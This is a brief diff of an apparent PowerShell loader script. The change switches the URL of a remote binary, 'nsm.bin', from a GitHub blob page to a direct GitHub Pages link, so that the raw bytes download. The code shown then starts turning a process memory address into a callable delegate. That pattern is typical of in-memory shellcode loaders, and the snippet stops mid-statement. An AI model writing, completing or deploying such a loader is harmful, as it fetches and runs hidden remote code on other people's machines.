@@ -1,4 +1,4 @@
-$u = "https://github.com/vaerds/cdn/blob/main/nsm.bin"
+$u = "https://vaerds.github.io/cdn/nsm.bin"
 
 $k = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Get-Process -Id $PID).Modules.BaseAddress, [Action]
